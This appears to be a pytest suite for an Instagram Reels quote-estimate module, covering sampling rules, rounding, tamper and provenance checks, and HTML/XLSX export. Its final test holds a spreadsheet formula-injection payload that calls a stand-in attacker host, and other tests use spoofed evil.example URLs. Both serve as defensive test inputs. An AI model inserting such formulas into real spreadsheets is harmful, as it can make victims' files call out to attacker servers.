"""预估报价契约：采样口径、金额、评分隔离及 HTML/XLSX 交付。"""
from __future__ import annotations

import copy
import hashlib
import sys
from io import BytesIO
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "scripts"))
sys.path.insert(0, str(REPO / "tests"))

import export_v2_html  # noqa: E402
import export_v2_xlsx  # noqa: E402
from _fixtures import clean_full  # noqa: E402
from extensions.sop_v2 import pricing, scoring  # noqa: E402
from extensions.sop_v2.config import load_config  # noqa: E402
from extensions.sop_v2.run_v2 import decide  # noqa: E402


CFG = load_config()


def _reel(code, plays, taken_at, *, pinned=False, **overrides):
    row = {
        "code": code,
        "url": f"https://www.instagram.com/reel/{code}/",
        "is_reel": True,
        "pinned": pinned,
        "pinned_source": "ig_media_info_pin_lists",
        "taken_at": taken_at,
        "play_count": plays,
        "play_count_status": "observed",
        "play_count_source": "ig_media_info.ig_play_count",
        "captured_at": "2026-07-28T10:00:00+08:00",
        "media_identity_provenance": {
            "requested_shortcode": code,
            "original_shortcode": code,
            "canonical_shortcode": None,
            "response_code": code,
            "identity_verified": True,
        },
    }
    row.update(overrides)
    return row


def _ten_reel_estimate(plays=12_345):
    return pricing.derive_quote_estimate(
        {
            "pricing_reel_samples": [
                _reel(f"R{i:02}", plays, i) for i in range(1, 11)
            ],
            "pricing_captured_at": "2026-07-28T10:00:00+08:00",
        },
        CFG,
    )


def _complete_candidate(plays=12_345):
    cand = {
        "handle": "owner",
        "pricing_reel_samples": [
            _reel(f"R{i:02}", plays, i) for i in range(1, 11)
        ],
        "pricing_captured_at": "2026-07-28T10:00:00+08:00",
    }
    cand["pricing_estimate"] = pricing.derive_quote_estimate(cand, CFG)
    return cand


def _exhausted_candidate(reels, *, empty_marker=None, **extra):
    for grid_rank, reel in enumerate(reels):
        reel.setdefault("grid_rank", grid_rank)
    evidence = {
        "schema_version": pricing.REELS_TAB_EVIDENCE_SCHEMA_VERSION,
        "source": pricing.REELS_TAB_EVIDENCE_SOURCE,
        "status": "exhausted",
        "reason": pricing.REELS_TAB_EXHAUSTED_REASON,
        "unique_reels_seen": len(pricing.ordered_reel_identities(reels)),
        "ordered_reel_identity_sha256": pricing.reel_identity_sha256(reels),
        "scroll_attempts": 3,
        "stable_bottom_rounds": 2,
        "required_stable_bottom_rounds": 2,
        "at_bottom": True,
        "loading_visible": False,
        "page_identity_verified": True,
        "reels_tab_route_verified": True,
        "page_healthy": True,
        "challenge": False,
        "logged_out": False,
        "private_account": False,
        "error_page": False,
        "expected_handle": "owner",
        "observed_handle": "owner",
        "requested_pathname": "/owner/reels/",
        "final_pathname": "/owner/reels/",
        "empty_state_verified": empty_marker is not None,
        "empty_reels_marker": empty_marker,
        "captured_at": "2026-08-11T12:00:00+08:00",
    }
    return {
        "handle": "owner",
        "pricing_reel_samples": reels,
        "pricing_reels_tab_evidence": evidence,
        **extra,
    }


def _surface_absent_candidate(**evidence_overrides):
    feed_identities = [f"p:P{i}" for i in range(12)]
    feed_sha = hashlib.sha256(
        "\n".join(feed_identities).encode("utf-8")
    ).hexdigest()
    snapshots = [
        {
            "navigation_index": index,
            "requested_pathname": "/owner/reels/",
            "final_pathname": "/owner/",
            "expected_handle": "owner",
            "observed_handle": "owner",
            "page_identity_verified": True,
            "profile_healthy": True,
            "redirected_to_profile": True,
            "reels_tab_route_verified": False,
            "reels_tab_link_present": False,
            "reel_links_seen": 0,
            "feed_post_count": 12,
            "feed_post_identities": feed_identities,
            "feed_post_identity_sha256": feed_sha,
            "loading_visible": False,
            "challenge": False,
            "logged_out": False,
            "private_account": False,
            "error_page": False,
            "captured_at": f"2026-08-11T12:00:0{index}+08:00",
        }
        for index in (1, 2)
    ]
    evidence = {
        "schema_version": pricing.REELS_TAB_EVIDENCE_SCHEMA_VERSION,
        "source": pricing.REELS_TAB_EVIDENCE_SOURCE,
        "status": "reels_surface_absent",
        "reason": (
            "reels_route_redirected_to_healthy_profile_without_reels_surface"
        ),
        "expected_handle": "owner",
        "observed_handle": "owner",
        "requested_pathname": "/owner/reels/",
        "final_pathname": "/owner/",
        "unique_reels_seen": 0,
        "ordered_reel_identity_sha256": pricing.reel_identity_sha256([]),
        "scroll_attempts": 0,
        "stable_bottom_rounds": 0,
        "required_stable_bottom_rounds": 2,
        "at_bottom": False,
        "loading_visible": False,
        "page_identity_verified": True,
        "reels_tab_route_verified": False,
        "page_healthy": False,
        "profile_healthy": True,
        "redirected_to_profile": True,
        "reels_tab_link_present": False,
        "reel_links_seen": 0,
        "unique_feed_posts_seen": 12,
        "profile_probe_rounds": 2,
        "required_profile_probe_rounds": 2,
        "reels_surface_probe_navigations": 2,
        "required_reels_surface_probe_navigations": 2,
        "reels_surface_probe_snapshots": snapshots,
        "challenge": False,
        "logged_out": False,
        "private_account": False,
        "error_page": False,
        "empty_state_verified": False,
        "empty_reels_marker": None,
        "captured_at": "2026-08-11T12:00:00+08:00",
    }
    evidence.update(evidence_overrides)
    return {
        "handle": "owner",
        "pricing_reel_samples": [],
        "pricing_reels_tab_evidence": evidence,
    }


def _delivery(estimate):
    return {
        "generated_at": "2026-07-28T10:30:00+08:00",
        "manifest": {
            "batch_id": "PRICE-CONTRACT",
            "campaign_track": "paid",
        },
        "candidates": [
            {
                "handle": "price_creator",
                "full_name": "Price Creator",
                "final_pool": "Include-Without-Storefront",
                "follower_count": 50_000,
                "core_niche_key": "skincare",
                "storefront_status": "confirmed_no",
                "pricing_estimate": estimate,
            }
        ],
    }


def test_recent_non_pinned_reels_are_sorted_deduped_then_windowed():
    eligible = [_reel(f"E{i:02}", i * 1_000, i) for i in range(1, 13)]
    # 故意打乱；更旧的 E12 重复项不能覆盖最新一条，也不能占第二个样本位。
    posts = eligible[::2] + list(reversed(eligible[1::2]))
    posts.extend(
        [
            _reel("PIN13", 900_000, 13, pinned=True),
            _reel("PIN14", 800_000, 14, pinned=True),
            _reel("E12", 999_999, 0),
            _reel("UNKNOWN_PIN", 700_000, 15, pinned=None),
            _reel(
                "UNOBSERVED",
                600_000,
                16,
                play_count_status="missing",
            ),
            {
                "code": "STATIC_POST",
                "url": "https://www.instagram.com/p/STATIC_POST/",
                "is_reel": False,
                "pinned": False,
                "taken_at": 17,
                "play_count": 500_000,
            },
        ]
    )

    result = pricing.derive_quote_estimate(
        {"pricing_reel_samples": posts}, CFG
    )

    assert result["status"] == "complete"
    assert result["source"] == "instagram_media_info_ig_play_count"
    assert result["sample_count"] == result["requested_reels"] == 10
    assert result["pinned_excluded"] == 2
    assert [row["code"] for row in result["reels"]] == [
        "E12",
        "E11",
        "E10",
        "E09",
        "E08",
        "E07",
        "E06",
        "E05",
        "E04",
        "E03",
    ]
    assert len({row["code"] for row in result["reels"]}) == 10
    assert all(row["pinned"] is False for row in result["reels"])
    assert result["average_plays"] == 7_500
    assert result["cpm_usd"] == {"default": 35.0, "min": 35.0, "max": 40.0}
    assert result["quote_usd"] == {
        "default": 262.5,
        "min": 262.5,
        "max": 300.0,
    }


def test_quote_uses_decimal_half_up_for_35_default_and_35_to_40_range():
    result = pricing.derive_quote_estimate(
        {"pricing_reel_samples": [_reel("ROUND", 12_345, 1)]}, CFG
    )

    # 12,345 / 1,000 × 35 = 432.075，应按财务展示口径进位到 432.08。
    assert result["status"] == "partial"
    assert result["average_plays"] == 12_345
    assert result["quote_usd"]["default"] == 432.08
    assert result["quote_usd"]["min"] == 432.08
    assert result["quote_usd"]["max"] == 493.8


@pytest.mark.parametrize(
    "estimate_mutation",
    [
        lambda estimate: estimate.update(schema_version=999),
        lambda estimate: estimate.update(currency="EUR"),
        lambda estimate: estimate.update(method="hand_edited"),
        lambda estimate: estimate.update(requested_reels=999),
        lambda estimate: estimate.update(pinned_excluded=999),
        lambda estimate: estimate.update(
            cpm_usd={"default": 1.0, "min": 1.0, "max": 1.0}
        ),
        lambda estimate: estimate.update(reels=[]),
        lambda estimate: estimate.update(captured_at="1999-01-01T00:00:00Z"),
        lambda estimate: estimate.update(population_basis="forged"),
        lambda estimate: estimate.update(population_evidence={"forged": True}),
    ],
)
def test_completion_rejects_any_tampered_customer_quote_field(
    estimate_mutation,
):
    cand = _complete_candidate()
    estimate_mutation(cand["pricing_estimate"])

    assert pricing.completion_reasons(cand, CFG)


def test_legacy_schema1_complete_checks_all_original_fields_but_not_new_summary():
    cand = _complete_candidate()
    estimate = cand["pricing_estimate"]
    estimate["schema_version"] = 1
    estimate.pop("population_basis")
    estimate.pop("population_evidence")

    assert pricing.completion_reasons(cand, CFG) == []

    estimate["requested_reels"] = 999
    assert pricing.completion_reasons(cand, CFG) == [
        "报价字段与原始证据不一致(requested_reels)"
    ]


def test_exhausted_short_reels_population_is_complete_available():
    reels = [_reel(f"SHORT{i}", i * 10_000, i) for i in range(1, 6)]
    cand = _exhausted_candidate(reels)

    result = pricing.derive_quote_estimate(cand, CFG)
    cand["pricing_estimate"] = result

    assert result["status"] == "complete_available"
    assert result["sample_count"] == 5
    assert result["average_plays"] == 30_000
    assert result["quote_usd"] == {
        "default": 1_050.0,
        "min": 1_050.0,
        "max": 1_200.0,
    }
    assert result["population_basis"] == "all_available_non_pinned_reels"
    assert result["population_evidence"]["reels_tab_exhausted"] is True
    assert result["population_evidence"]["population_complete"] is True
    assert pricing.completion_reasons(cand, CFG) == []


def test_verified_empty_reels_tab_is_not_applicable_and_quote_stays_null():
    cand = _exhausted_candidate([], empty_marker="No Reels Yet")

    result = pricing.derive_quote_estimate(cand, CFG)
    cand["pricing_estimate"] = result

    assert result["status"] == "not_applicable_no_reels"
    assert result["source"] == "instagram_reels_tab_exhausted_no_reels"
    assert result["sample_count"] == 0
    assert result["average_plays"] is None
    assert result["quote_usd"] == {"default": None, "min": None, "max": None}
    assert result["population_evidence"]["empty_state_verified"] is True
    assert pricing.completion_reasons(cand, CFG) == []


def test_two_independent_healthy_profile_redirects_prove_reels_surface_absent():
    cand = _surface_absent_candidate()

    result = pricing.derive_quote_estimate(cand, CFG)
    cand["pricing_estimate"] = result

    assert result["status"] == "not_applicable_no_reels"
    assert result["source"] == "instagram_profile_reels_surface_absent"
    assert result["population_evidence"]["proof_mode"] == "reels_surface_absent"
    assert result["population_evidence"]["empty_state_verified"] is True
    assert pricing.completion_reasons(cand, CFG) == []


@pytest.mark.parametrize(
    "override",
    [
        {"reels_surface_probe_navigations": 1},
        {"profile_probe_rounds": 1},
        {"reels_tab_link_present": True},
        {"reel_links_seen": 1},
        {"unique_feed_posts_seen": 0},
        {"profile_healthy": False},
        {"loading_visible": True},
        {"challenge": True},
        {"error_page": True},
        {"reels_surface_probe_snapshots": []},
        {"final_pathname": "/other/"},
    ],
)
def test_weak_or_unhealthy_profile_redirect_never_proves_no_reels(override):
    result = pricing.derive_quote_estimate(
        _surface_absent_candidate(**override), CFG
    )

    assert result["status"] == "missing"
    assert result["population_evidence"]["proof_mode"] == "unproven"


@pytest.mark.parametrize(
    "snapshot_mutation",
    [
        lambda row: row.update(feed_post_count=0, feed_post_identities=[]),
        lambda row: row.update(feed_post_identity_sha256="forged"),
        lambda row: row.update(observed_handle="other"),
        lambda row: row.update(final_pathname="/other/"),
        lambda row: row.update(reels_tab_link_present=True),
        lambda row: row.update(reel_links_seen=1),
        lambda row: row.update(loading_visible=True),
        lambda row: row.update(error_page=True),
    ],
)
def test_each_surface_navigation_snapshot_is_independently_validated(
    snapshot_mutation,
):
    cand = _surface_absent_candidate()
    snapshot_mutation(
        cand["pricing_reels_tab_evidence"][
            "reels_surface_probe_snapshots"
        ][1]
    )

    result = pricing.derive_quote_estimate(cand, CFG)

    assert result["status"] == "missing"
    assert result["population_evidence"]["reels_surface_absent"] is False


@pytest.mark.parametrize(
    "evidence_override",
    [
        {"status": "not_exhausted", "reason": "max_scrolls_reached"},
        {"page_healthy": False},
        {"challenge": True},
        {"logged_out": True},
        {"private_account": True},
        {"error_page": True},
        {"page_identity_verified": False},
    ],
)
def test_short_population_never_completes_without_healthy_exhaustion(
    evidence_override,
):
    reels = [_reel(f"UNPROVEN{i}", 10_000, i) for i in range(5)]
    cand = _exhausted_candidate(reels)
    cand["pricing_reels_tab_evidence"].update(evidence_override)

    result = pricing.derive_quote_estimate(cand, CFG)

    assert result["status"] == "partial"
    assert result["population_evidence"]["population_complete"] is False


def test_empty_dom_without_explicit_empty_marker_is_missing_not_no_reels():
    cand = _exhausted_candidate([])

    result = pricing.derive_quote_estimate(cand, CFG)

    assert result["status"] == "missing"
    assert result["quote_usd"]["default"] is None


def test_exhausted_grid_with_unclassified_reel_remains_partial_or_missing():
    observed = _reel("OBSERVED", 10_000, 2)
    failed = _reel(
        "FAILED", None, 1, pinned=None, play_count_status="api_http_429"
    )
    cand = _exhausted_candidate([observed, failed])

    result = pricing.derive_quote_estimate(cand, CFG)

    assert result["status"] == "partial"
    assert result["sample_count"] == 1
    assert result["population_evidence"]["reels_tab_exhausted"] is True
    assert result["population_evidence"]["population_complete"] is False


def test_strict_pinned_reel_without_exposed_play_count_can_close_population():
    rows = [
        _reel("NONPIN1", 10_000, 3),
        _reel("NONPIN2", 20_000, 2),
        _reel(
            "PINNED",
            None,
            1,
            pinned=True,
            play_count_status="ig_not_exposed",
            play_count_source=None,
        ),
    ]

    result = pricing.derive_quote_estimate(_exhausted_candidate(rows), CFG)

    assert result["status"] == "complete_available"
    assert result["sample_count"] == 2
    assert result["pinned_excluded"] == 1
    assert result["average_plays"] == 15_000
    assert result["population_evidence"]["population_complete"] is True


@pytest.mark.parametrize(
    "field_mutation",
    [
        lambda row: row.update(pinned_source="ig_profile_grid"),
        lambda row: row.pop("media_identity_provenance"),
        lambda row: row["media_identity_provenance"].update(
            identity_verified=False
        ),
        lambda row: row["media_identity_provenance"].update(
            response_code="DIFFERENT"
        ),
    ],
)
def test_pinned_reel_still_requires_media_info_identity_and_pin_proof(
    field_mutation,
):
    pinned = _reel(
        "PINNED",
        None,
        1,
        pinned=True,
        play_count_status="ig_not_exposed",
        play_count_source=None,
    )
    field_mutation(pinned)

    result = pricing.derive_quote_estimate(
        _exhausted_candidate([_reel("NONPIN", 10_000, 2), pinned]), CFG
    )

    assert result["status"] == "partial"
    assert result["population_evidence"]["population_complete"] is False


def test_media_provenance_copied_from_another_row_cannot_close_population():
    rows = [_reel("ROW_A", 10_000, 2), _reel("ROW_B", 20_000, 1)]
    rows[0]["media_identity_provenance"] = copy.deepcopy(
        rows[1]["media_identity_provenance"]
    )

    result = pricing.derive_quote_estimate(_exhausted_candidate(rows), CFG)

    assert result["status"] == "partial"
    assert result["population_evidence"]["population_complete"] is False


@pytest.mark.parametrize(
    "row_mutation",
    [
        lambda row: row.update(
            code="/p/ROW_A/",
            url="https://www.instagram.com/p/ROW_A/",
        ),
        lambda row: row.update(url="https://evil.example/reel/ROW_A/"),
        lambda row: row.update(url="http://www.instagram.com/reel/ROW_A/"),
        lambda row: row.update(url="https://www.instagram.com/reel/OTHER/"),
    ],
)
def test_row_media_kind_host_and_shortcode_must_match_provenance(row_mutation):
    row = _reel("ROW_A", 10_000, 1)
    row_mutation(row)

    result = pricing.derive_quote_estimate(
        _exhausted_candidate([row]), CFG
    )

    assert result["status"] == "partial"


def _canonical_alias_reel():
    original = "Dbsxxpdx8a1AKZQkBUvtz0VaOdErIRRX9Qw1SI0"
    canonical = "Dbsxxpdx8a1"
    row = _reel(original, 10_000, 1)
    row["media_identity_provenance"].update(
        requested_shortcode=canonical,
        original_shortcode=original,
        canonical_shortcode=canonical,
        page_canonical_url=(
            f"https://www.instagram.com/owner/reel/{canonical}/"
        ),
        response_code=original,
    )
    return row


def test_https_instagram_same_kind_bound_canonical_alias_can_close_population():
    result = pricing.derive_quote_estimate(
        _exhausted_candidate([_canonical_alias_reel()]), CFG
    )

    assert result["status"] == "complete_available"


@pytest.mark.parametrize(
    "provenance_mutation",
    [
        lambda p: p.update(original_shortcode="UNRELATED"),
        lambda p: p.update(requested_shortcode="DIFFERENT"),
        lambda p: p.update(
            canonical_shortcode="NOT_A_PREFIX",
            requested_shortcode="NOT_A_PREFIX",
            page_canonical_url=(
                "https://www.instagram.com/owner/reel/NOT_A_PREFIX/"
            ),
        ),
        lambda p: p.update(
            page_canonical_url="http://www.instagram.com/owner/reel/Dbsxxpdx8a1/"
        ),
        lambda p: p.update(
            page_canonical_url="https://evil.example/owner/reel/Dbsxxpdx8a1/"
        ),
        lambda p: p.update(
            page_canonical_url="https://www.instagram.com/owner/p/Dbsxxpdx8a1/"
        ),
        lambda p: p.update(
            page_canonical_url="https://www.instagram.com/owner/reel/OTHER/"
        ),
    ],
)
def test_unbound_or_untrusted_canonical_alias_cannot_close_population(
    provenance_mutation,
):
    row = _canonical_alias_reel()
    provenance_mutation(row["media_identity_provenance"])

    result = pricing.derive_quote_estimate(
        _exhausted_candidate([row]), CFG
    )

    assert result["status"] == "partial"


def test_non_alias_provenance_cannot_smuggle_page_canonical_url():
    row = _reel("ROW_A", 10_000, 1)
    row["media_identity_provenance"]["page_canonical_url"] = (
        "https://www.instagram.com/reel/ROW_A/"
    )

    result = pricing.derive_quote_estimate(
        _exhausted_candidate([row]), CFG
    )

    assert result["status"] == "partial"


@pytest.mark.parametrize(
    "field_mutation",
    [
        lambda row: row.pop("pinned_source"),
        lambda row: row.update(pinned_source="ig_profile_grid"),
        lambda row: row.pop("media_identity_provenance"),
        lambda row: row["media_identity_provenance"].update(
            identity_verified=False
        ),
        lambda row: row["media_identity_provenance"].update(
            response_code="DIFFERENT"
        ),
        lambda row: row.update(play_count_source="ig_media_info.play_count"),
    ],
)
def test_legacy_or_unverified_media_rows_cannot_close_short_population(
    field_mutation,
):
    rows = [_reel(f"STRICT{i}", 10_000, i) for i in range(5)]
    field_mutation(rows[0])

    result = pricing.derive_quote_estimate(
        _exhausted_candidate(rows), CFG
    )

    assert result["status"] == "partial"
    assert result["population_evidence"]["population_complete"] is False


def test_partial_and_missing_are_explicit_and_modash_never_enters_quote():
    partial = pricing.derive_quote_estimate(
        {
            "pricing_reel_samples": [
                _reel(f"P{i}", 10_000, i) for i in range(1, 10)
            ]
        },
        CFG,
    )
    fallback = pricing.derive_quote_estimate(
        {
            # pinned=None 不是“已确认非置顶”，不得放入 IG 原生样本。
            "pricing_reel_samples": [
                _reel("UNKNOWN", 999_999, 1, pinned=None)
            ],
            "avg_reels_plays": 40_000,
        },
        CFG,
    )
    missing = pricing.derive_quote_estimate({}, CFG)

    assert partial["status"] == "partial"
    assert partial["sample_count"] == 9
    assert partial["source"] == "instagram_media_info_ig_play_count"
    assert partial["quote_usd"]["default"] == 350.0

    assert fallback["status"] == "missing"
    assert fallback["source"] == "missing"
    assert fallback["sample_count"] == 0
    assert fallback["reels"] == []
    assert fallback["average_plays"] is None
    assert fallback["quote_usd"] == {
        "default": None,
        "min": None,
        "max": None,
    }

    assert missing["status"] == "missing"
    assert missing["source"] == "missing"
    assert missing["average_plays"] is None
    assert missing["quote_usd"] == {"default": None, "min": None, "max": None}


def test_estimated_quote_does_not_write_paid_cpm_or_change_f_score_or_route():
    priced_input = clean_full(
        handle="priced",
        paid_cpm=None,
        pricing_reel_samples=[
            _reel(f"S{i:02}", 20_000, i) for i in range(1, 11)
        ],
    )
    unpriced_input = clean_full(handle="unpriced", paid_cpm=None)

    priced = decide(priced_input, CFG)
    unpriced = decide(unpriced_input, CFG)

    assert "pricing_estimate" not in priced_input  # decide 不反向污染调用方
    assert priced["paid_cpm"] is None
    assert priced["pricing_estimate"]["quote_usd"]["default"] == 700.0
    assert priced["score_by_module"]["F"] == {"earned": 0.0, "available": 0}
    assert priced["score_by_module"]["F"] == unpriced["score_by_module"]["F"]
    assert priced["normalized_total"] == unpriced["normalized_total"]
    assert priced["ai_vetting_score"] == unpriced["ai_vetting_score"]
    assert priced["final_pool"] == unpriced["final_pool"]

    # 即使日后解除“本轮 F 模块全 N/A”，估价也不能偷渡成实际 paid_cpm。
    cfg_with_f_enabled = copy.deepcopy(CFG)
    cfg_with_f_enabled["scoring"]["F"]["defer_this_round"] = False
    f_items = scoring.score_F(
        clean_full(
            paid_cpm=None,
            pricing_estimate=priced["pricing_estimate"],
        ),
        cfg_with_f_enabled,
    )
    cpm = next(item for item in f_items if item.item == "cpm")
    assert cpm.available is None
    assert cpm.earned is None
    assert cpm.reason == "no_quote_na"


def test_delivery_status_labels_distinguish_partial_legacy_fallback_and_missing():
    partial = pricing.derive_quote_estimate(
        {
            "pricing_reel_samples": [
                _reel(f"P{i}", 10_000, i) for i in range(1, 10)
            ]
        },
        CFG,
    )
    fallback = {
        "status": "fallback_modash",
        "requested_reels": 10,
        "sample_count": 0,
        "average_plays": 40_000,
        "quote_usd": {"default": 1400, "min": 1400, "max": 1600},
    }
    missing = pricing.derive_quote_estimate({}, CFG)

    assert "IG 样本 9/10" in export_v2_html._pricing_cell(  # noqa: SLF001
        {"pricing_estimate": partial}
    )
    assert "第三方均播替代" in export_v2_html._pricing_cell(  # noqa: SLF001
        {"pricing_estimate": fallback}
    )
    assert "待补近 10 条非置顶 Reels 播放量" in export_v2_html._pricing_cell(  # noqa: SLF001
        {"pricing_estimate": missing}
    )
    assert "Tab 穷尽未证明" in export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": partial}, "pricing_status"
    )
    assert "正式口径禁止" in export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": fallback}, "pricing_status"
    )
    assert export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": missing}, "pricing_status"
    ) == "待补 Reels 播放量（Tab 穷尽/原生指标未证明）"


def test_html_shows_quote_range_method_reel_evidence_and_disclaimer():
    result = _ten_reel_estimate()
    rendered = export_v2_html.build_html(_delivery(result))

    assert "预估报价（USD）" in rendered
    assert "$432.08" in rendered
    assert "区间 $432.08–$493.80" in rendered
    assert "IG 近 10 条非置顶 Reels" in rendered
    assert "按 CPM $35（区间 $35–40）估算，非实际报价" in rendered
    assert "预估报价证据与口径" in rendered
    assert "展示型估算，非博主实际报价；不参与评分或路由" in rendered
    assert (
        "complete · 10/10 · instagram_media_info_ig_play_count"
        in rendered
    )
    assert 'href="https://www.instagram.com/reel/R10/"' in rendered


def test_html_and_xlsx_explain_exhausted_short_population_and_no_reels():
    short_reels = [_reel(f"AVAILABLE{i}", 10_000, i) for i in range(5)]
    short_cand = _exhausted_candidate(short_reels)
    short = pricing.derive_quote_estimate(short_cand, CFG)
    none_cand = _exhausted_candidate([], empty_marker="No Reels Yet")
    none = pricing.derive_quote_estimate(none_cand, CFG)

    assert "全部可用 Reels 5/10" in export_v2_html._pricing_cell(  # noqa: SLF001
        {"pricing_estimate": short}
    )
    assert "连续 2 轮到底无增长" in export_v2_html._pricing_cell(  # noqa: SLF001
        {"pricing_estimate": short}
    )
    assert "不适用：Reels Tab 已穷尽" in export_v2_html._pricing_cell(  # noqa: SLF001
        {"pricing_estimate": none}
    )
    assert "全部可用 Reels 5/10" in export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": short}, "pricing_status"
    )
    assert "Tab穷尽=是" in export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": short}, "pricing_population"
    )
    assert "不适用" in export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": none}, "pricing_status"
    )
    assert export_v2_xlsx._cell(  # noqa: SLF001
        {"pricing_estimate": none}, "pricing_quote"
    ) is None


def test_xlsx_keeps_quote_fields_numeric_and_documents_non_actual_quote():
    from openpyxl import load_workbook

    result = _ten_reel_estimate()
    original = export_v2_xlsx.build_workbook(_delivery(result))
    blob = BytesIO()
    original.save(blob)
    blob.seek(0)
    workbook = load_workbook(blob)

    sheet = workbook["纳入·无橱窗"]
    headers = {
        sheet.cell(1, column).value: column
        for column in range(1, sheet.max_column + 1)
    }
    expected_headers = {
        "非置顶 Reels 样本",
        "近 10 条非置顶 Reels 均播",
        "预估报价 USD（CPM 35）",
        "预估上限 USD（CPM 40）",
        "报价状态 / 来源",
        "Reels 总体证据",
    }
    assert expected_headers <= headers.keys()

    sample = sheet.cell(2, headers["非置顶 Reels 样本"])
    average = sheet.cell(2, headers["近 10 条非置顶 Reels 均播"])
    default_quote = sheet.cell(2, headers["预估报价 USD（CPM 35）"])
    high_quote = sheet.cell(2, headers["预估上限 USD（CPM 40）"])
    status = sheet.cell(2, headers["报价状态 / 来源"])

    assert sample.value == "10/10"
    assert sample.hyperlink.target == "https://www.instagram.com/reel/R10/"
    assert average.value == 12_345
    assert isinstance(average.value, (int, float))
    assert default_quote.value == pytest.approx(432.08)
    assert high_quote.value == pytest.approx(493.8)
    assert isinstance(default_quote.value, (int, float))
    assert isinstance(high_quote.value, (int, float))
    assert default_quote.number_format == "$#,##0.00"
    assert high_quote.number_format == "$#,##0.00"
    assert status.value == "完整 · IG 最近 10 条非置顶 Reels"

    summary = workbook["批次总览"]
    notes = {
        summary.cell(row, 1).value: summary.cell(row, 2).value
        for row in range(1, summary.max_row + 1)
    }
    pricing_note = notes["预估报价口径"]
    assert "先排除置顶 Reels，再取最近 10 条平均播放量" in pricing_note
    assert "默认 CPM $35，参考区间 $35–40" in pricing_note
    assert "不是博主实际报价，也不参与评分或路由" in pricing_note


def test_xlsx_keeps_missing_quote_numeric_columns_blank():
    missing = pricing.derive_quote_estimate({}, CFG)
    delivery = _delivery(missing)
    delivery["candidates"][0]["final_pool"] = "Review"
    workbook = export_v2_xlsx.build_workbook(delivery)
    sheet = workbook["待复核"]
    headers = {
        sheet.cell(1, column).value: column
        for column in range(1, sheet.max_column + 1)
    }

    assert sheet.cell(2, headers["非置顶 Reels 样本"]).value == "待补"
    assert sheet.cell(2, headers["近 10 条非置顶 Reels 均播"]).value is None
    assert sheet.cell(2, headers["预估报价 USD（CPM 35）"]).value is None
    assert sheet.cell(2, headers["预估上限 USD（CPM 40）"]).value is None
    assert sheet.cell(2, headers["报价状态 / 来源"]).value == "待补 Reels 播放量（Tab 穷尽/原生指标未证明）"


def test_total_or_facebook_play_count_never_enters_native_ig_quote():
    result = pricing.derive_quote_estimate(
        {
            "pricing_reel_samples": [
                _reel(
                    "TOTAL_ONLY",
                    999_999,
                    1,
                    play_count_source="ig_media_info.play_count",
                    ig_play_count=None,
                    total_play_count=999_999,
                    fb_play_count=900_000,
                )
            ]
        },
        CFG,
    )

    assert result["status"] == "missing"
    assert result["sample_count"] == 0
    assert result["average_plays"] is None
    assert result["quote_usd"]["default"] is None


def test_relative_and_absolute_reel_urls_only_take_one_sample_slot():
    first = _reel("SAME", 10_000, 2)
    duplicate = _reel("SAME", 99_999, 1)
    duplicate["code"] = "https://www.instagram.com/reel/SAME/?utm_source=x"

    result = pricing.derive_quote_estimate(
        {"pricing_reel_samples": [first, duplicate]}, CFG
    )

    assert result["sample_count"] == 1
    assert result["average_plays"] == 10_000


def test_legacy_video_post_is_not_misclassified_as_reel_or_priced():
    result = pricing.derive_quote_estimate(
        {
            "sampled_posts": [
                {
                    "code": "/p/VIDEO/",
                    "is_video": True,
                    "media_type": 2,
                    "pinned": False,
                    "play_count": 500_000,
                    "play_count_status": "observed",
                }
            ]
        },
        CFG,
    )

    assert result["status"] == "missing"
    assert result["sample_count"] == 0


def test_grid_rank_preserves_recent_reels_when_timestamp_is_missing():
    posts = [
        _reel("NEW_MISSING_TIME", 10_000, None, grid_rank=0),
        _reel("OLDER_WITH_TIME", 20_000, 999, grid_rank=1),
    ]

    result = pricing.derive_quote_estimate(
        {"pricing_reel_samples": posts}, CFG
    )

    assert [row["code"] for row in result["reels"]] == [
        "NEW_MISSING_TIME",
        "OLDER_WITH_TIME",
    ]


@pytest.mark.parametrize(
    "value",
    ["=WEBSERVICE(\"https://attacker.invalid\")", "+1+1", "-1+1", "@SUM(1,1)"],
)
def test_xlsx_external_text_is_neutralized_against_formula_injection(value):
    assert export_v2_xlsx._xlsx_safe(value) == "'" + value  # noqa: SLF001
    assert export_v2_xlsx._xlsx_safe(123) == 123  # noqa: SLF001
